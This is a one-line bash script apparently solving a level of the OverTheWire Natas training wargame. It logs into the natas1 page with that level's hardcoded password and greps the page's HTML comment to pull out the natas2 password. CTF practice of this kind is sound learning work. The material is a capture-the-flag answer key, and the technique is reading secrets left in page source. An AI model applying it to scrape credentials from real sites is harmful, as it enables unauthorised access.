#!/usr/bin/bash

curl -s -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org/ | grep -Po '(?<=(natas2 is)).*(?= -->)'
